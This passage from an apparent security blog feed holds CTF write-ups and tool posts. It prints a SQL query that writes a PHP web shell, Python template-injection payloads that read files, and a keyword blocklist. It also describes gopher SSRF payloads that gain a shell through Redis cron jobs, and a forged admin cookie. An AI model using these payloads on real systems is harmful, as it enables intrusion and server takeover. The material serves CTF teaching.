background-color: rgba(0,0,0,0.8);}.text {  color: #f2f2f2;  font-size: 15px;  padding: 8px 12px;  position: absolute;  bottom: 8px;  width: 100%;  text-align: center;}.numbertext {  <!-- color: #f2f2f2; -->  color: #ffffff  font-size: 12px;  padding: 8px 12px;  position: absolute;  top: 0;}.dot {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot:hover {  background-color: #717171;}.dot1 {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot1:hover {  background-color: #717171;}.fade {  -webkit-animation-name: fade;  -webkit-animation-duration: 1.5s;  animation-name: fade;  animation-duration: 1.5s;}@-webkit-keyframes fade {  from {opacity: .4}  to {opacity: 1}}@keyframes fade {  from {opacity: .4}  to {opacity: 1}}@media only screen and (max-width: 300px) {  .prev, .next,.text {font-size: 11px}}</style><div class="slideshow-container"><br><br><div class="mySlides fade"><br>  <div class="numbertext">1 / 4</div><br>  <img src="/images/photos/blog1.2.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">2 / 4</div><br>  <img src="/images/photos/blog1.3.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">3 / 4</div><br>  <img src="/images/photos/blog1.4.png" style="width:100%"><br></div><div class="mySlides fade"><br>  <div class="numbertext">4 / 4</div><br>  <img src="/images/photos/blog1.5.png" style="width:100%"><br></div><p><a class="prev" onclick="plusSlides(-1)">&#10094;</a><br><a class="next" onclick="plusSlides(1)">&#10095;</a></p><p></div><br><br></p><script>var slideIndex = 1;showSlides(slideIndex);function plusSlides(n) {  showSlides(slideIndex += n);}function currentSlide(n) {  showSlides(slideIndex = n);}function showSlides(n) {  var i;  var slides = document.getElementsByClassName("mySlides");  var dots = document.getElementsByClassName("dot");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><p>So from the database we got nothing but a msg: <code>dig hard</code><br>so what else we can do? lets check the permission of that user<br>SQL query for that:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.user_privileges;</span><br></pre></td></tr></table></figure><br><img src="/images/photos/blog1.6.png" alt="a"><br><img src="/images/photos/blog1.7.png" alt="a"><br>So as you can see that we have <code>FILE</code> permission, means you can use <code>LOAD_FILE, OUTFILE</code>…RCE??<br>yeah you thought it right but where you can put the file?<br>So there are only specific location where you can put files, so for that you need to check <code>mysqld.cnf</code> file. As we were using ubuntu 16.04, the location of that file is: <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> (you can google for finding the location).<br>Now let’s make gopher payload:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> LOAD_FILE(<span class="string">&#x27;/etc/mysql/mysql.conf.d/mysqld.cnf&#x27;</span>);</span><br></pre></td></tr></table></figure><br><img src="/images/photos/blog1.8.png" alt="a"><br><img src="/images/photos/blog1.9.png" alt="a"><br>So here you can see that there is <code>/tmp_is_great</code> folder and we can access this directly from the server.<br>Means this is the folder where we have to put our file:<br>The SQL query we need to execute:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &quot;&lt;?php system($_REQUEST[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp_is_great/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><br><img src="/images/photos/blog1.10.png" alt="a"><br><img src="/images/photos/blog1.11.png" alt="a"><br><img src="/images/photos/blog1.12.png" alt="a"><br>And finally we got the flag: <code>inctf&#123;Th1s_w4s_n07_e4sy_cha11_bu7_Y0u_d1d_17!!!&#125;</code>  </p><h2 id="TorPy"><a href="#TorPy" class="headerlink" title="TorPy"></a>TorPy</h2><p>This was SSTI challenge and you need to read <code>/flag</code> file.<br>and you would have done this   </p><p><code>curl -I http://18.223.211.42/</code>  </p><p>You will get that this challenge is with tornado-server<br>So if you did check then these things were blocked:  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;for&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;tornado&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;app&#x27;</span>,<span class="string">&#x27;base&#x27;</span></span><br></pre></td></tr></table></figure><p>As you know that python challenge don’t have one solution, there are alot of ways to read the files.<br>But the intended one was this:<br>This was basically a type of black-box testing, If you were trying some of the function, objects, classes that can be used for exploiting SSTI then hopefully, you should have reached to <code>__reduce__</code> function.<br>In python2 we do know a payload related to <code>reduce</code> function:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__reduce__(<span class="number">42</span>)[<span class="number">0</span>].func_globals.values()[<span class="number">12</span>].values()[<span class="number">79</span>](<span class="string">&#x27;./flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><br>the <code>12</code> is the index of <code>__builtins__</code><br>and <code>79</code> is the index of <code>&lt;built-in function     open&gt;</code><br>index changes with respect to the server, so you need to find for the challenge server.<br>but it won’t work in python3, so we need to do some change over there:<br>1st one <code>func_globals</code> is not valid in python3, so we need to change it to <code>__globals__</code><br>2nd one <code>dict_values</code> doesn’t support indexing in python3, so we need to find index using with <code>list</code>.<br>And here you can’t use braces <code>[ ]</code>, but instead you can use <code>__getitem__</code> or <code>get</code><br>So final payload looks like:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="built_in">list</span>(<span class="built_in">list</span>(<span class="string">&#x27;&#x27;</span>.__reduce__(<span class="number">42</span>).__getitem__(<span class="number">0</span>).__globals__.values()).__getitem__(<span class="number">1</span>).values()).__getitem__(<span class="number">125</span>)(<span class="string">&quot;/flag&quot;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>Here again:<br>the <code>1</code> is the index of <code>__builtins__</code><br>and <code>125</code> is the index of <code>&lt;built-in function     open&gt;</code><br>index changes with respect to the server, so you need to find for the challenge server.<br>after doing these things perfectly you will get flag:<br><code>inctf&#123;Wh3n_SST1_M33ts_T0rn4d0_U51ing_Pyth0n3_!!!_1t5_M461c4l&#125;</code>  </p><p>You could have read the files like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dict</span>(b=<span class="built_in">globals</span>).get(<span class="string">&#x27;b&#x27;</span>)().pop(<span class="string">&#x27;__buil&#x27;</span><span class="string">&#x27;tins__&#x27;</span>).pop(<span class="string">&#x27;op&#x27;</span><span class="string">&#x27;en&#x27;</span>)(<span class="string">&#x27;/flag&#x27;</span>).read()  </span><br><span class="line"><span class="built_in">globals</span>().__getitem__(<span class="string">&#x27;__bui&#x27;</span><span class="string">&#x27;ltins__&#x27;</span>).__getitem__(<span class="string">&#x27;op&#x27;</span><span class="string">&#x27;en&#x27;</span>)(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br></pre></td></tr></table></figure><br>like this there are alot ways. But I hope from this writeup you would have got a new trick.</p><p>I hope you guys found this article helpful, enjoy your day. You are welcome to give reviews on this article and on my challenge.</p>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> CTF </tag>
            
            <tag> Writeup </tag>
            
            <tag> InCTF </tag>
            
            <tag> Gopherus </tag>
            
            <tag> SQL </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog on Gopherus Tool</title>
      <link href="/2018/08/14/2018-08-14-blog-on-gopherus/"/>
      <url>/2018/08/14/2018-08-14-blog-on-gopherus/</url>
      
        <content type="html"><![CDATA[<p>Hey Everyone, I am writing this blog on my tool <a href="https://github.com/tarunkant/Gopherus">Gopherus</a></p><h2 id="What-this-tool-do-exactly"><a href="#What-this-tool-do-exactly" class="headerlink" title="What this tool do exactly?"></a>What this tool do exactly?</h2><p>Generates Gopher payload for exploiting SSRF and gaining RCE, on SSRF vulnerable sites.<br>I’ve written this tool for MySQL, FastCGI, Memcached, Redis, Zabbix, SMTP servers.<br>So here we will talk about all sever with his exploitation technique in details separately.</p><h2 id="Explanation-of-each-attack"><a href="#Explanation-of-each-attack" class="headerlink" title="Explanation of each attack:"></a>Explanation of each attack:</h2><h3 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h3><p>As I automated this before <a href="https://github.com/tarunkant/Automation/blob/master/SSRF-through-Gopher.py">here</a>. Now I only need to upgrade it.<br>So now it has additional features like, now it won’t ask for MySQL packets as earlier one does, here it will directly ask Username and will create Gopher payload for doing SSRF.<br>And I have written a blog on the same describing my python script <a href="https://spyclub.tech/2018/ssrf-through-gopher/">here</a>  </p><p><img src="/images/photos/tool2.0.png" alt="image"></p><h3 id="FastCGI"><a href="#FastCGI" class="headerlink" title="FastCGI"></a>FastCGI</h3><p>If the port 9000 is open then this vulnerability can exist and it can lead to RCE, only you need to send some data as you can see in the python script.<br>For exploiting it only you need to provide a filename which must exist on the victim system(preferable .php) BTW I have put one default file named <code>/usr/share/php/PEAR.php</code> and then one terminal command to execute in the victim system.<br>And then you done, you will get gopher payload which will do the rest.  </p><p><img src="/images/photos/tool2.2.png" alt="image"></p><h3 id="Memcached"><a href="#Memcached" class="headerlink" title="Memcached"></a>Memcached</h3><p>It uses the port 11211 for communication. We mainly use Memcached for storing serialized data but when it comes to De-serialize these data then known vulnerability such as PHP De-serialization issue, Python-Pickle De-serialization issue, Ruby-Marshal De-serialization issue comes into picture which can lead to RCE.<br>So for each of them, I made script separately and one script for dumping the contents of Memcached.  </p><style>* {box-sizing: border-box}body {font-family: Verdana, sans-serif; margin:0}.mySlides {display: none}img {vertical-align: middle;}.slideshow-container {  max-width: 1000px;  position: relative;  margin: auto;}.prev, .next {  cursor: pointer;  position: absolute;  top: 50%;  width: auto;  padding: 16px;  margin-top: -22px;  color: white;  font-weight: bold;  font-size: 18px;  transition: 0.6s ease;  border-radius: 0 3px 3px 0;}.next {  right: 0;  border-radius: 3px 0 0 3px;}.prev:hover, .next:hover {  background-color: rgba(0,0,0,0.8);}.text {  color: #f2f2f2;  font-size: 15px;  padding: 8px 12px;  position: absolute;  bottom: 8px;  width: 100%;  text-align: center;}.numbertext {  color: #f2f2f2;  font-size: 12px;  padding: 8px 12px;  position: absolute;  top: 0;}.dot {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot:hover {  background-color: #717171;}.dot1 {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot1:hover {  background-color: #717171;}.fade {  -webkit-animation-name: fade;  -webkit-animation-duration: 1.5s;  animation-name: fade;  animation-duration: 1.5s;}@-webkit-keyframes fade {  from {opacity: .4}  to {opacity: 1}}@keyframes fade {  from {opacity: .4}  to {opacity: 1}}@media only screen and (max-width: 300px) {  .prev, .next,.text {font-size: 11px}}</style><div class="slideshow-container"><br><br><div class="mySlides fade"><br>  <div class="numbertext">1 / 4</div><br>  <img src="/images/photos/tool2.3.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">2 / 4</div><br>  <img src="/images/photos/tool2.5.png" style="width:100%"><br><br></div><div class="mySlides fade"><br>  <div class="numbertext">3 / 4</div><br>  <img src="/images/photos/tool2.6.png" style="width:100%"><br></div><div class="mySlides fade"><br>  <div class="numbertext">4 / 4</div><br>  <img src="/images/photos/tool2.7.png" style="width:100%"><br></div><p><a class="prev" onclick="plusSlides(-1)">&#10094;</a><br><a class="next" onclick="plusSlides(1)">&#10095;</a></p><p></div><br><br></p><script>var slideIndex = 1;showSlides(slideIndex);function plusSlides(n) {  showSlides(slideIndex += n);}function currentSlide(n) {  showSlides(slideIndex = n);}function showSlides(n) {  var i;  var slides = document.getElementsByClassName("mySlides");  var dots = document.getElementsByClassName("dot");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><h3 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h3><p>It uses the port 6379, and when this port is open it allows us to over-write the files in the system, so in the way of exploiting it, what we will do is, we will write one cronjob for opening a port with shell, so that when we will connect to victim server we will get victim’s shell.<br>Also, we can write one PHP shell file and will put into the web-root location.<br>So tool will ask you the location of crontab(differs as OS changes) of the victim and when you wanted PHP shell then it will also ask you payload to put in shell file BTW we have put PHP shell code as default.  </p><div class="slideshow-container"><br><br><div class="mySlides1 fade"><br>  <div class="numbertext">1 / 2</div><br>  <img src="/images/photos/tool2.4.png" style="width:100%"><br></div><div class="mySlides1 fade1"><br>  <div class="numbertext">2 / 2</div><br>  <img src="/images/photos/tool2.8.png" style="width:100%"><br></div><p><a class="prev" onclick="plusSlides1(-1)">&#10094;</a><br><a class="next" onclick="plusSlides1(1)">&#10095;</a></p><p><br><br></div></p><script>var slideIndex = 1;showSlides1(slideIndex);function plusSlides1(n) {  showSlides1(slideIndex += n);}function currentSlide1(n) {  showSlides1(slideIndex = n);}function showSlides1(n) {  var i;  var slides = document.getElementsByClassName("mySlides1");  var dots = document.getElementsByClassName("dot1");  if (n > slides.length) {slideIndex = 1}      if (n < 1) {slideIndex = slides.length}  for (i = 0; i < slides.length; i++) {      slides[i].style.display = "none";    }  for (i = 0; i < dots.length; i++) {      dots[i].className = dots[i].className.replace(" active", "");  }  slides[slideIndex-1].style.display = "block";    dots[slideIndex-1].className += " active";}</script><h3 id="Zabbix"><a href="#Zabbix" class="headerlink" title="Zabbix"></a>Zabbix</h3><p>It uses the port 10050. Here you can get SSRF or RCE when the victim had allowed <code>EnableRemoteCommands = 1</code>.<br>So the script will create a gopher link which will communicate with the Zabbix server and give you the result.  </p><p><img src="/images/photos/tool2.9.png" alt="image"></p><h3 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h3><p>SMTP server uses port 25 for sending mails, So as for SSRF we can send mail to anyone as a victim user and the generated gopher payload will do the same.  </p><p><img src="/images/photos/tool2.10.png" alt="image"></p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>You can get Usage and screenshots <a href="https://github.com/tarunkant/Gopherus#usage">here</a>  </p><p>I hope you found it a nice article.</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Gopher </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Blog on EndPoint-Finder Tool</title>
      <link href="/2018/07/30/2018-07-30-blog-on-endpoint-finder/"/>
      <url>/2018/07/30/2018-07-30-blog-on-endpoint-finder/</url>
      
        <content type="html"><![CDATA[<p>Hey Everyone, I am writing this blog on my tool <a href="https://github.com/tarunkant/EndPoint-Finder">EndPoint-Finder</a> and also here I will be describing My python script.<br><!--break--></p><h2 id="What-this-tool-do-exactly"><a href="#What-this-tool-do-exactly" class="headerlink" title="What this tool do exactly?"></a>What this tool do exactly?</h2><p>This tool finds all end-points of JavaScript file.</p><h4 id="What-is-End-Point-exactly"><a href="#What-is-End-Point-exactly" class="headerlink" title="- What is End-Point exactly?"></a>- What is <code>End-Point</code> exactly?</h4><p>Go with the name itself <code>End</code> and <code>point</code>, means The point (the directories, files or parameter) which is the end of that JavaScript file.  </p><h2 id="Describing-Python-script"><a href="#Describing-Python-script" class="headerlink" title="Describing Python script"></a>Describing Python script</h2><p>you can get full code <a href="https://github.com/tarunkant/EndPoint-Finder/blob/master/EndPoint-Finder.py">here</a><br>So our first functions is <code>end_points</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">end_point = []</span><br><span class="line">extension=(<span class="string">&quot;.png&quot;</span>,<span class="string">&quot;.jpg&quot;</span>,<span class="string">&quot;.wav&quot;</span>,<span class="string">&quot;.jpeg&quot;</span>,</span><br><span class="line"><span class="string">&quot;.json&quot;</span>,<span class="string">&quot;.js&quot;</span>,<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.xml&quot;</span>)    <span class="comment">#more can be added, as requirement</span></span><br><span class="line">start = (<span class="string">&quot;/&quot;</span>,<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;file://&quot;</span>,</span><br><span class="line"><span class="string">&quot;php://&quot;</span>,<span class="string">&quot;ftp://&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;../&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">end_points</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[a-zA-Z0-9_\/:&amp;?%.\-=]*$&quot;</span>, i):</span><br><span class="line">            <span class="keyword">if</span> (i.startswith(start) <span class="keyword">or</span> i.endswith(extension)):</span><br><span class="line">                end_point.append(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> content:</span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">&quot;^[a-zA-Z0-9_\/:&amp;?%.\-=]*$&quot;</span>, i):</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">not</span> i.startswith(start)):</span><br><span class="line">                temp = i.split(<span class="string">&quot;/&quot;</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;/&quot;</span>+temp[<span class="number">0</span>] <span class="keyword">in</span> end_point <span class="keyword">or</span> <span class="string">&quot;./&quot;</span>+temp[<span class="number">0</span>] <span class="keyword">in</span> end_point <span class="keyword">or</span> <span class="string">&quot;../&quot;</span>+temp[<span class="number">0</span>] <span class="keyword">in</span> end_point:</span><br><span class="line">                    end_point.append(i)</span><br></pre></td></tr></table></figure><br>So <code>First for loop</code> is checking if <code>content</code>(It is list) having characters matching with given regex, is there if yes then it will check that it should start with specified protocols <code>start</code> or it should end with specified <code>extensions</code>, and if it passes all <code>if</code> statement than it will append in <code>end_point</code>.<br><code>Second for loop</code> is checking for expected directories (not sure if it present!). So first same they are matching with given regex and if it is there then it should not start with <code>start</code>(because I have taken this before <code>in first loop</code>) then I am splitting <code>content</code> with <code>/</code> and if <code>0th index</code> of that keyword is present in <code>end_point</code> list, then append it too.<br>Say one example:<br>Ques: If <code>/teams</code> is in <code>end_point</code> list and JS also contains one name like <code>teams/members</code>(no any <code>start</code> or <code>extension</code>). So what we can say?<br>Ans: <code>teams/members</code> can be present there, because <code>/teams</code> exist in <code>end_point</code>.<br>That’s why <code>teams/members</code> will be appended in <code>end_point</code> list(because of <code>Second for loop</code>)  </p><p>Second function is <code>saving_in_file</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saving_in_file</span>(<span class="params">end_point</span>):</span></span><br><span class="line">        f=<span class="built_in">open</span>(args.output,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        f.write(end_point)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><br>If they specify for output file then it will save result in file and it will be in readable fashion.  </p><p>Third function is <code>print_end_points</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_end_points</span>(<span class="params">end_point</span>):</span></span><br><span class="line">    start1=(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;https://&quot;</span>,</span><br><span class="line"><span class="string">&quot;file://&quot;</span>,<span class="string">&quot;php://&quot;</span>,<span class="string">&quot;ftp://&quot;</span>)</span><br><span class="line">    a=<span class="string">&quot;\n-----------------Remote files which are added-----------------------------------\n&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(args.output): saving_in_file(a)</span><br><span class="line">    <span class="built_in">print</span> a</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> end_point:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(start1):</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">            <span class="keyword">if</span>(args.output): saving_in_file(i)</span><br><span class="line"></span><br><span class="line">    b=<span class="string">&quot;\n-----------------These files are present in server------------------------------\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> b</span><br><span class="line">    <span class="keyword">if</span>(args.output): saving_in_file(b)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> end_point:</span><br><span class="line">        <span class="keyword">if</span> i.endswith(extension):</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">            <span class="keyword">if</span>(args.output): saving_in_file(i)</span><br><span class="line"></span><br><span class="line">    c=<span class="string">&quot;\n-----------------These are files and directory, you can look into---------------\n&quot;</span></span><br><span class="line">    <span class="built_in">print</span> c</span><br><span class="line">    <span class="keyword">if</span>(args.output): saving_in_file(c)</span><br><span class="line">    start1=(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;../&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> end_point:</span><br><span class="line">        <span class="keyword">if</span> i.startswith(start1) <span class="keyword">and</span> <span class="keyword">not</span> (i.endswith(extension)):</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">            <span class="keyword">if</span>(args.output): saving_in_file(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;\n-----------------These directory can be present (not sure!!)--------------------\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> end_point:</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> i.startswith(start) <span class="keyword">and</span> <span class="keyword">not</span> i.endswith(extension)):</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">            <span class="keyword">if</span>(args.output): saving_in_file(i)</span><br></pre></td></tr></table></figure><br>This function is for printing the contents in <code>end_point</code> list, but it will group it into parts, like first it will print all remote files which exists in JS file, then files having extensions and parameters, then files and directory starting with <code>/, ./, ../</code> and last it will print <code>expected directories</code>.<br>It is sure that you won’t get repeated output.  </p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><p>you can get usage and screenshots <a href="https://github.com/tarunkant/EndPoint-Finder#usage">here</a>  </p><p>I hope you found it nice article.</p>]]></content>
      
      
      <categories>
          
          <category> tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> End-Points </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unintended Vuln in BackdoorCTF Challenges ¯\_(ツ)_/¯</title>
      <link href="/2018/03/18/2018-03-18-backdoorctf-writeup/"/>
      <url>/2018/03/18/2018-03-18-backdoorctf-writeup/</url>
      
        <content type="html"><![CDATA[<p>Hey, I am SpyD3r(<a href="https://twitter.com/TarunkantG">@TarunkantG</a>) from team bi0s and the teambi0s secured 9th position in <a href="https://twitter.com/BackdoorCTF">@BackdoorCTF</a>.<br>In this CTF there was a lot of unintended vulns, If you talk about web then, I did <em>Two first blood</em> on challenges Get-Hired which had about 14 solves, and Get-hired-2 which had only 3 solves, by SpyD3r(<a href="https://twitter.com/teambi0s">@teambi0s</a>), <a href="https://twitter.com/jinmo123">@jinmo123</a>(CyKor), and<a href="https://twitter.com/DefConUA">@DefConUA</a>.<br>And another team member solved Bf-Captcha as in an unintended way.<br><!--break--><br>And there was also one backdoor in BackdoorCTF from that <a href="https://twitter.com/greunion_ctf">@greunion_ctf</a> got access into their server. And because of that, they added one bug-bounty field along with the challenges.<br>So this CTF went off like searching any unintended way or finding any backdoor 😛  </p><h2 id="How-I-got-unintended-Vulns"><a href="#How-I-got-unintended-Vulns" class="headerlink" title="How I got unintended Vulns"></a>How I got unintended Vulns</h2><p>I think challenge developers was using gedit and forgot to delete <code>Tilde</code>  files 😛  </p><h3 id="Get-Hired"><a href="#Get-Hired" class="headerlink" title="Get-Hired"></a>Get-Hired</h3><p><code>https://pastebin.com/raw/VHDPJNjU</code><br><img src="/images/photos/back1.png" alt="a"><br><br><br><br>And this thing made my work too easy 😛<br>Now we have function for both Encryption and Decryption.<br>And we can see there, cookie is encrypted using encrypt_string function and one more thing to notice is :<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$rows</span>[<span class="number">0</span>][<span class="string">&#x27;id&#x27;</span>] . <span class="string">&#x27;&#123;-&#125;&#x27;</span> . <span class="variable">$username</span> . <span class="string">&#x27;&#123;-&#125;&#x27;</span> .<span class="variable">$rows</span>[<span class="number">0</span>][<span class="string">&#x27;email&#x27;</span>]. <span class="string">&#x27;&#123;-&#125;&#x27;</span> . <span class="variable">$rows</span>[<span class="number">0</span>][<span class="string">&#x27;team_name&#x27;</span>];</span><br></pre></td></tr></table></figure><br>And our target is to login as “admin”.<br>So, we know the $username(‘admin’), and while searching for remaining details I encountered with profile section and there I got to know that I can play with <code>id</code> parameter<br><br><br><img src="/images/photos/back2.png" alt="a"><br><br><br>So, till now I got <code>id</code> , <code>username</code> and <code>team_name</code> yet to found email.<br>while playing more I also got to know that email is <a href="mailto:`infoseciitr@gmail.com">`infoseciitr@gmail.com</a>` .<br>Now what??<br>Just encrypt it<br><br><br><img src="/images/photos/back3.png" alt="a"><br><br><br>Now make it URL encoded and change user cookie to this…AND YOU DONE<br><br></p><style>* {box-sizing: border-box}body {font-family: Verdana, sans-serif; margin:0}.mySlides {display: none}img {vertical-align: middle;}.slideshow-container {  max-width: 1000px;  position: relative;  margin: auto;}.prev, .next {  cursor: pointer;  position: absolute;  top: 50%;  width: auto;  padding: 16px;  margin-top: -22px;  color: white;  font-weight: bold;  font-size: 18px;  transition: 0.6s ease;  border-radius: 0 3px 3px 0;}.next {  right: 0;  border-radius: 3px 0 0 3px;}.prev:hover, .next:hover {  background-color: rgba(0,0,0,0.8);}.text {  color: #f2f2f2;  font-size: 15px;  padding: 8px 12px;  position: absolute;  bottom: 8px;  width: 100%;  text-align: center;}.numbertext {  color: #f2f2f2;  font-size: 12px;  padding: 8px 12px;  position: absolute;  top: 0;}.dot {  cursor: pointer;  height: 15px;  width: 15px;  margin: 0 2px;  background-color: #bbb;  border-radius: 50%;  display: inline-block;  transition: background-color 0.6s ease;}.active, .dot:hover {  background-color: #717171;}.dot1 {  cursor: pointer;  height: 